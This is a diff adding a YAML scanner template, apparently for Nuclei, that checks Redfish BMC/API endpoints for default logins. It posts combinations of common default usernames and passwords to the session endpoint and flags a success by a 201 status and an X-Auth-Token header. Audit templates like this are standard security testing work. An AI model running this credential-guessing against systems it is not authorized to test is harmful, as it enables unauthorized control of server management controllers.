@@ -1,0 +1,54 @@
+id: redfish-bmc-default-login
+info:
+  author: c-sh0
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: Redfish BMC/API Default Login
+  name: Redfish BMC/API Default Login
+  reference:
+  - https://ftp1.tyan.com/pub/doc/MiTAC_AST2500_Redfish_API_Doc_0.04.pdf
+  severity: high
+  tags: default-login,api,bmc,redfish
+requests:
+- attack: clusterbomb
+  matchers:
+  - status:
+    - 201
+    type: status
+  - part: header
+    type: word
+    words:
+    - X-Auth-Token
+  - part: body
+    type: word
+    words:
+    - /redfish/v1/$metadataSessionService/Sessions
+  matchers-condition: and
+  payloads:
+    password:
+    - ADMIN
+    - admin
+    - superuser
+    - PASSW0RD
+    username:
+    - ADMIN
+    - admin
+    - root
+    - Administrator
+    - sysadmin
+    - USERID
+  raw:
+  - 'POST /redfish/v1/SessionService/Sessions HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"UserName":"{{username}}","Password":"{{password}}"}
+
+    '
+  redirects: false
+  stop-at-first-match: true
